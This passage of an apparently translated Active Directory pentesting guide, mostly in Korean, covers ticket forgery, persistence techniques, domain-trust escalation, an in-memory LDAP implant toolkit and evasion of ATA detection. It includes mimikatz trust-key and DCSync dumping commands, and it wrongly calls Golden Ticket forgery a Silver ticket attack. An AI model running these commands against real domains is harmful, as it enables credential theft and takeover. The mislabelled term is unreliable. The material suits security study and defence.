A **Golden Ticket attack** involves an attacker gaining access to the **NTLM hash of the krbtgt account** in an Active Directory (AD) environment. This account is special because it's used to sign all **Ticket Granting Tickets (TGTs)**, which are essential for authenticating within the AD network.

Once the attacker obtains this hash, they can create **TGTs** for any account they choose (Silver ticket attack).

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

These are like golden tickets forged in a way that **bypasses common golden tickets detection mechanisms.**

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**계정의 인증서를 보유하거나 이를 요청할 수 있는 능력**은 사용자의 계정에 지속적으로 머무르는 매우 좋은 방법입니다(비밀번호를 변경해도 가능합니다):

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**인증서를 사용하면 도메인 내부에서 높은 권한으로 지속적으로 머무르는 것도 가능합니다:**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory의 AdminSDHolder 객체는 Domain Admins와 Enterprise Admins와 같은 **특권 그룹**의 보안을 보장하기 위해 이들 그룹에 표준 **Access Control List (ACL)**를 적용하여 무단 변경을 방지합니다. 그러나 이 기능은 악용될 수 있습니다. 공격자가 AdminSDHolder의 ACL을 수정해 일반 사용자에게 전체 접근 권한을 부여하면, 그 사용자는 모든 특권 그룹에 대한 광범위한 통제권을 얻게 됩니다. 본래 보호를 위한 이 보안 조치는 밀접하게 모니터링되지 않으면 오히려 역효과를 내어 부적절한 접근을 허용할 수 있습니다.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

모든 **Domain Controller (DC)**에는 **로컬 관리자(local administrator)** 계정이 존재합니다. 해당 머신에서 관리자 권한을 얻으면 **mimikatz**를 사용해 로컬 Administrator의 hash를 추출할 수 있습니다. 그 다음에는 이 비밀번호 사용을 **가능하게 하기 위해** 레지스트리 수정을 해야 하며, 이를 통해 로컬 Administrator 계정에 원격으로 접근할 수 있게 됩니다.

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

특정 도메인 객체에 대해 사용자에게 **특별 권한**을 부여하여 향후 그 사용자가 **권한을 상승**할 수 있게 만들 수 있습니다.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### 보안 설명자

**security descriptors**는 객체가 가지는 **권한**을 **저장**하는 데 사용됩니다. 객체의 **security descriptor**를 조금만 변경할 수 있다면, 특권 그룹의 구성원이 되지 않고도 해당 객체에 대해 매우 유용한 권한을 획득할 수 있습니다.

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

메모리에서 **LSASS**를 변경해 **범용 비밀번호**를 설정하면 모든 도메인 계정에 접근할 수 있습니다.

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
자체 **SSP**를 만들어 머신에 접근하는 데 사용되는 자격증명을 **평문으로 캡처**할 수 있습니다.

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

이는 AD에 **새로운 Domain Controller**를 등록하고 이를 사용해 지정된 객체들에 대한 속성(SIDHistory, SPNs...)을 **수정 로그를 남기지 않고** 푸시합니다. 이 작업을 하려면 **DA** 권한이 필요하며 **루트 도메인** 내에 있어야 합니다.\
잘못된 데이터를 사용하면 상당히 보기 안좋은 로그가 남을 수 있다는 점에 유의하세요.

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

앞서 **LAPS 비밀번호를 읽을 수 있는 충분한 권한**이 있으면 권한을 상승시키는 방법을 논의했습니다. 그러나 이 비밀번호들은 **지속성 유지**에도 사용될 수 있습니다.\
확인:

{{#ref}}
laps.md
{{#endref}}

## 포리스트 권한 상승 - 도메인 트러스트

Microsoft는 **Forest**를 보안 경계로 간주합니다. 이는 **하나의 도메인만 침해되어도 포리스트 전체가 침해될 가능성이 있다**는 것을 의미합니다.

### 기본 정보

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)는 한 도메인의 사용자가 다른 도메인의 리소스에 접근할 수 있게 해주는 보안 메커니즘입니다. 본질적으로 두 도메인의 인증 시스템 간에 연결을 생성하여 인증 검증이 원활하게 흐르도록 합니다. 도메인들이 트러스트를 설정하면, 트러스트의 무결성에 중요한 특정 **키**들을 각 도메인의 **Domain Controllers (DCs)**에 교환하여 보관합니다.

일반적인 시나리오에서 사용자가 **trusted domain**의 서비스에 접근하려면 먼저 자신의 도메인 DC로부터 **inter-realm TGT**라는 특별한 티켓을 요청해야 합니다. 이 TGT는 양 도메인이 합의한 공유 **키**로 암호화됩니다. 그런 다음 사용자는 이 TGT를 **trusted domain의 DC**에 제시하여 서비스 티켓(**TGS**)을 얻습니다. trusted domain의 DC가 inter-realm TGT를 성공적으로 검증하면 TGS를 발행해 사용자에게 서비스 접근을 허용합니다.

**절차**:

1. **Domain 1**의 **클라이언트 컴퓨터**가 자신의 **NTLM hash**를 사용하여 **Domain Controller (DC1)**에 **Ticket Granting Ticket (TGT)**을 요청하면서 과정을 시작합니다.
2. 클라이언트가 성공적으로 인증되면 DC1은 새로운 TGT를 발급합니다.
3. 클라이언트는 이후 **Domain 2**의 리소스에 접근하기 위해 DC1에 **inter-realm TGT**를 요청합니다.
4. inter-realm TGT는 양방향 도메인 트러스트의 일부로 DC1과 DC2가 공유하는 **trust key**로 암호화됩니다.
5. 클라이언트는 inter-realm TGT를 **Domain 2의 Domain Controller (DC2)**에 가져갑니다.
6. DC2는 공유된 trust key로 inter-realm TGT를 검증하고, 유효하면 클라이언트가 접근하려는 Domain 2 내 서버에 대한 **Ticket Granting Service (TGS)**를 발급합니다.
7. 마지막으로 클라이언트는 이 TGS를 서버에 제시하는데, 해당 TGS는 서버 계정의 hash로 암호화되어 있으며 이를 통해 Domain 2의 서비스에 접근합니다.

### 다양한 트러스트 유형

**트러스트는 단방향(1-way) 또는 양방향(2-way)일 수 있습니다**. 양방향에서는 양쪽 도메인이 서로를 신뢰하지만, **단방향(1-way)** 트러스트에서는 한 도메인이 **trusted**가 되고 다른 도메인이 **trusting**이 됩니다. 이 경우 **trusted 도메인에서는 trusting 도메인의 리소스만 접근할 수 있습니다**.

만약 Domain A가 Domain B를 신뢰하면, A는 trusting 도메인이고 B는 trusted 도메인입니다. 또한 **Domain A**에서는 이것이 **Outbound trust**가 되고, **Domain B**에서는 **Inbound trust**가 됩니다.

**Different trusting relationships**

- **Parent-Child Trusts**: 같은 포리스트 내에서 흔히 설정되는 구성으로, 자식 도메인은 자동으로 부모 도메인과 양방향 전이 트러스트(two-way transitive trust)를 형성합니다. 본질적으로 부모와 자식 간에 인증 요청이 원활하게 흐를 수 있음을 의미합니다.
- **Cross-link Trusts**: "shortcut trusts"라고도 불리며, 자식 도메인들 사이에 설정되어 참조 과정을 단축합니다. 복잡한 포리스트에서는 인증 참조가 보통 포리스트 루트까지 올라갔다가 목표 도메인으로 내려가야 합니다. 크로스-링크를 만들면 경로가 단축되어 지리적으로 분산된 환경에서 특히 유용합니다.
- **External Trusts**: 서로 관련이 없는 도메인 간에 설정되며 비전이성(non-transitive)입니다. Microsoft의 문서에 따르면 외부 트러스트는 포리스트 트러스트로 연결되지 않은 외부 도메인의 리소스에 접근할 때 유용합니다. 보안은 외부 트러스트와 함께 SID 필터링으로 강화됩니다.
- **Tree-root Trusts**: 포리스트 루트 도메인과 새로 추가된 트리 루트 간에 자동으로 형성되는 트러스트입니다. 자주 보이는 구성은 아니지만, 새로운 도메인 트리를 포리스트에 추가할 때 유용하며 두 방향으로 전이되는 특성을 유지합니다.
- **Forest Trusts**: 두 포리스트 루트 도메인 간의 양방향 전이 트러스트로, SID 필터링을 적용하여 보안을 강화합니다.
- **MIT Trusts**: 비-Windows의 RFC4120 규격을 준수하는 Kerberos 도메인과 설정되는 트러스트입니다. MIT 트러스트는 Windows 생태계 외부의 Kerberos 기반 시스템과 통합해야 하는 환경을 위해 사용됩니다.

#### 신뢰 관계의 다른 차이점

- 트러스트 관계는 **전이적(transitive)**일 수도 있고 **비전이적(non-transitive)**일 수도 있습니다 (예: A가 B를 신뢰하고 B가 C를 신뢰하면 A는 C를 신뢰함).
- 트러스트 관계는 **양방향**(서로 신뢰)으로 설정될 수도 있고 **단방향**(한쪽만 신뢰)으로 설정될 수도 있습니다.

### 공격 경로

1. **열거**(Enumerate)하여 신뢰 관계 파악
2. 어떤 **security principal**(사용자/그룹/컴퓨터)이 **다른 도메인**의 리소스에 **액세스**할 수 있는지(ACE 항목이나 다른 도메인의 그룹 포함 여부 등)를 확인하세요. **도메인 간 관계**를 찾아보세요(트러스트는 아마도 이를 위해 생성되었을 가능성이 높습니다).
1. kerberoast는 이 경우 또 다른 옵션이 될 수 있습니다.
3. 도메인 간으로 **피벗**할 수 있는 **계정들**을 **탈취**하세요.

공격자는 주로 다음 세 가지 메커니즘을 통해 다른 도메인의 리소스에 접근할 수 있습니다:

- **Local Group Membership**: 프린시펄이 머신의 로컬 그룹(예: 서버의 “Administrators” 그룹)에 추가될 수 있으며, 이를 통해 해당 머신에 대한 강력한 제어 권한을 얻게 됩니다.
- **Foreign Domain Group Membership**: 프린시펄이 외부 도메인의 그룹 구성원일 수도 있습니다. 그러나 이 방법의 효과는 트러스트의 성격과 그룹의 범위에 따라 달라집니다.
- **Access Control Lists (ACLs)**: 프린시펄이 **ACL**, 특히 **DACL** 내의 **ACE** 항목으로 지정되어 특정 리소스에 접근 권한을 가질 수 있습니다. ACL, DACL, ACE의 메커니즘을 더 깊이 이해하려면 백서 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”이 훌륭한 자료입니다.

### 권한이 있는 외부 사용자/그룹 찾기

도메인 내의 외부 보안 프린시펄을 찾으려면 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**을 확인하세요. 이는 **외부 도메인/포리스트**의 사용자/그룹입니다.

이 항목은 **Bloodhound**에서 확인하거나 powerview를 사용하여 확인할 수 있습니다:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### 자식-부모 포리스트 privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
domain trusts를 enumerate하는 다른 방법:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 신뢰된 키가 **2개** 있습니다. 하나는 _Child --> Parent_ 용이고 다른 하나는 _Parent_ --> _Child_ 용입니다.\
> 현재 도메인에서 사용되는 키를 확인하려면 다음을 사용하세요:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

신뢰를 악용해 SID-History injection으로 child/parent 도메인에서 Enterprise admin으로 권한 상승:

{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration NC가 어떻게 활용될 수 있는지 이해하는 것은 매우 중요합니다. Configuration NC는 Active Directory (AD) 환경에서 포리스트 전체의 구성 데이터를 저장하는 중앙 저장소 역할을 합니다. 이 데이터는 포리스트 내 모든 Domain Controller (DC)로 복제되며, writable DC는 Configuration NC의 쓰기 가능한 복사본을 유지합니다. 이를 이용하려면 **DC에서 SYSTEM 권한**이 필요하며, 이상적으로는 child DC가 좋습니다.

**Link GPO to root DC site**

Configuration NC의 Sites 컨테이너는 AD 포리스트 내 모든 도메인 가입 컴퓨터들의 사이트 정보를 포함합니다. 어떤 DC에서든 SYSTEM 권한으로 작동하면 공격자는 GPO를 root DC sites에 연결할 수 있습니다. 이 조작은 해당 사이트에 적용되는 정책을 변경함으로써 루트 도메인을 잠재적으로 손상시킬 수 있습니다.

자세한 내용은 다음 연구를 참고하세요: [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

공격 벡터 중 하나는 도메인 내 권한 있는 gMSA를 노리는 것입니다. gMSA의 비밀번호를 계산하는 데 필요한 KDS Root key는 Configuration NC에 저장됩니다. 어떤 DC에서든 SYSTEM 권한이 있다면 KDS Root key에 접근하여 포리스트 내 모든 gMSA의 비밀번호를 계산할 수 있습니다.

자세한 분석 및 단계별 가이드는 다음을 참조하세요:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

보완적인 delegated MSA 공격 (BadSuccessor – migration 속성 남용):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

추가 외부 연구: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

이 방법은 새로 생성되는 권한 있는 AD 객체를 기다리는 인내가 필요합니다. SYSTEM 권한을 가진 공격자는 AD Schema를 수정하여 어떤 사용자에게든 모든 클래스에 대한 완전한 제어 권한을 부여할 수 있습니다. 이는 새로 생성되는 AD 객체들에 대한 무단 접근 및 제어로 이어질 수 있습니다.

자세한 내용은 다음을 참고하세요: [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 취약점은 PKI 객체를 제어하여 포리스트 내의 어떤 사용자로도 인증할 수 있는 certificate template을 생성할 수 있게 하는 공격을 목표로 합니다. PKI 객체는 Configuration NC에 존재하므로, 쓰기 가능한 child DC를 탈취하면 ESC5 공격을 수행할 수 있습니다.

자세한 내용은 다음에서 확인하세요: [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). ADCS가 없는 환경에서는 공격자가 필요한 구성 요소를 직접 설정할 수도 있으며, 이에 대해서는 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)를 참조하세요.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
이 경우 **귀하의 도메인이** 외부 도메인에 의해 신뢰되어 해당 도메인에 대해 **확인되지 않은 권한**을 부여받습니다. 귀하는 **귀하 도메인의 어떤 주체들이 외부 도메인에 대해 어떤 접근 권한을 갖고 있는지** 찾아낸 다음 이를 악용해 보아야 합니다:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 외부 포리스트 도메인 - 단방향(아웃바운드)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In this 시나리오에서 **your domain** 은 다른 **domains** 의 principal 에게 일부 **privileges** 를 **trusting** 하고 있습니다.

그러나, **domain is trusted** 상태가 trusting domain 에 의해 설정되면, trusted domain 은 **predictable name** 을 가진 **creates a user** 를 생성하고 그 **password** 로 **the trusted password** 를 사용합니다. 즉, **access a user from the trusting domain to get inside the trusted one** 하여 내부를 열람하고 추가 권한 상승을 시도할 수 있다는 뜻입니다:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain 을 침해하는 또 다른 방법은 도메인 트러스트의 **opposite direction** 에 생성된 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)를 찾는 것입니다(이는 흔하지 않습니다).

또 다른 방법은 trusted domain 의 **user** 가 **RDP** 로 로그인할 수 있는 머신에 대기하는 것입니다. 그런 다음 공격자는 RDP 세션 프로세스에 코드를 주입해 거기서 **access the origin domain of the victim** 할 수 있습니다. 또한, **victim mounted his hard drive** 상태라면, **RDP session** 프로세스에서 **startup folder of the hard drive** 에 **backdoors** 를 심을 수 있습니다. 이 기법을 **RDPInception** 이라 부릅니다.

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- forest trusts 전반에서 SID history 속성을 악용한 공격의 위험은 기본적으로 모든 inter-forest trusts 에서 활성화되어 있는 SID Filtering 으로 완화됩니다. 이는 Microsoft 가 보안 경계를 domain 이 아니라 forest 로 간주한다는 입장에 따라, intra-forest trusts 는 안전하다고 가정하는 전제에 기반합니다.
- 다만 SID filtering 은 일부 애플리케이션과 사용자 접근을 방해할 수 있어, 때때로 비활성화되는 경우가 있다는 점에 유의해야 합니다.

### **Selective Authentication:**

- inter-forest trusts 에 대해서는 Selective Authentication 을 적용하면 두 포리스트의 사용자가 자동으로 인증되지 않습니다. 대신, trusting domain 또는 forest 내의 도메인 및 서버에 접근하려면 명시적인 권한 부여가 필요합니다.
- 다만 이러한 조치들은 writable Configuration Naming Context (NC) 의 악용이나 trust account 를 공격하는 행위로부터 보호하지는 않습니다.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 은 bloodyAD-style LDAP primitives 를 x64 Beacon Object Files 로 재구현한 것으로, on-host implant(예: Adaptix C2) 내부에서 완전히 실행됩니다. 운영자는 패키지를 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 로 컴파일하고, `ldap.axs` 를 로드한 뒤 beacon 에서 `ldap <subcommand>` 를 호출합니다. 모든 트래픽은 현재 로그온 보안 컨텍스트를 통해 LDAP(389, signing/sealing) 또는 LDAPS(636, auto certificate trust) 로 전송되므로 socks 프록시나 디스크 아티팩트가 필요 없습니다.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, 및 `get-groupmembers` 는 short names/OU paths 를 전체 DN 으로 해석하여 해당 객체를 덤프합니다.
- `get-object`, `get-attribute`, 및 `get-domaininfo` 는 임의의 속성(보안 설명자 포함)과 `rootDSE` 로부터 forest/domain 메타데이터를 가져옵니다.
- `get-uac`, `get-spn`, `get-delegation`, 및 `get-rbcd` 는 로스팅 후보, delegation 설정, 그리고 LDAP 로부터 직접 기존의 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 설명자를 노출합니다.
- `get-acl` 및 `get-writable --detailed` 는 DACL 을 파싱해 trustees, 권한(GenericAll/WriteDACL/WriteOwner/attribute writes), 상속 여부를 나열하여 ACL 권한 상승을 위한 즉시 표적을 제공합니다.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 쓰기 기본 동작 — 권한 상승 및 지속성

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`)는 운영자가 OU 권한이 있는 곳에 새로운 principal 또는 컴퓨터 계정을 스테이징할 수 있게 해준다. `add-groupmember`, `set-password`, `add-attribute`, 및 `set-attribute`는 write-property 권한이 발견되면 대상 계정을 즉시 탈취한다.
- ACL 중심 명령어들인 `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, 및 `add-dcsync`는 AD 객체의 WriteDACL/WriteOwner을 비밀번호 재설정, 그룹 멤버십 제어 또는 DCSync 복제 권한으로 변환하여 PowerShell/ADSI 흔적을 남기지 않고 작업을 수행할 수 있게 한다. `remove-*` 대응 명령어들은 주입된 ACE들을 정리한다.

### Delegation, roasting, 및 Kerberos 악용

- `add-spn`/`set-spn`은 손상된 사용자를 즉시 Kerberoastable하게 만든다; `add-asreproastable` (UAC 토글)은 비밀번호를 건드리지 않고 AS-REP roasting 대상임을 표시한다.
- Delegation 매크로들(`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`)은 비콘에서 `msDS-AllowedToDelegateTo`, UAC 플래그, 또는 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 재작성하여 constrained/unconstrained/RBCD 공격 경로를 활성화하며 원격 PowerShell 또는 RSAT가 필요 없게 만든다.

### sidHistory injection, OU 이동 및 공격 표면 구성

- `add-sidhistory`는 권한 있는 SID들을 제어된 principal의 SID history에 주입한다 (see [SID-History Injection](sid-history-injection.md)), LDAP/LDAPS만으로 은밀한 권한 상속을 제공한다.
- `move-object`는 컴퓨터나 사용자의 DN/OU를 변경하여 공격자가 이미 위임 권한이 존재하는 OU로 자산을 끌어와 `set-password`, `add-groupmember`, 또는 `add-spn`을 남용할 수 있게 한다.
- 범위가 좁은 제거 명령들(`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, 등)은 운영자가 자격증명이나 지속성을 수집한 후 빠르게 롤백하여 텔레메트리를 최소화할 수 있게 한다.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **자격증명 보호를 위한 방어 조치**

- **Domain Admins 제한**: Domain Admins는 도메인 컨트롤러에만 로그인하도록 제한하고 다른 호스트에서는 사용하지 않는 것이 권장된다.
- **서비스 계정 권한**: 서비스는 보안을 위해 Domain Admin(DA) 권한으로 실행되어서는 안 된다.
- **일시적 권한 제한**: DA 권한이 필요한 작업은 기간을 제한해야 한다. 예: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 완화**: 이벤트 ID 2889/3074/3075를 감사한 후 DC/클라이언트에서 LDAP 서명 및 LDAPS 채널 바인딩을 적용하여 LDAP MITM/relay 시도를 차단한다.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **기만(Deception) 기법 구현**

- 기만 구현은 미끼 사용자나 컴퓨터와 같은 함정을 설정하는 것을 포함하며, 비밀번호가 만료되지 않거나 Trusted for Delegation으로 표시된 계정 같은 특징을 포함할 수 있다. 정확한 접근은 특정 권한을 가진 사용자를 생성하거나 고권한 그룹에 추가하는 것을 포함한다.
- 실용적 예시는 다음 도구 사용을 포함한다: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 기만 기법 배포에 대한 자세한 내용은 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)에서 확인할 수 있다.

### **기만 식별**

- **사용자 객체의 경우**: 의심스러운 지표로는 비정상적인 ObjectSID, 드문 로그온, 생성 날짜, 낮은 잘못된 비밀번호 횟수 등이 있다.
- **일반 지표**: 잠재적 미끼 객체의 속성을 실제 객체와 비교하면 불일치를 발견할 수 있다. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster)와 같은 도구가 기만 식별에 도움이 된다.

### **탐지 회피**

- **Microsoft ATA 탐지 회피**:
- **사용자 열거 회피**: ATA 탐지를 피하기 위해 도메인 컨트롤러에서의 세션 열거를 피한다.
- **티켓 위장**: 티켓 생성에 **aes** 키를 사용하면 NTLM으로 강등되지 않아 탐지를 회피하는 데 도움이 된다.
- **DCSync 공격**: 도메인 컨트롤러가 아닌 곳에서 실행하여 ATA 탐지를 피하는 것이 권장된다. 도메인 컨트롤러에서 직접 실행하면 경보가 발생한다.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
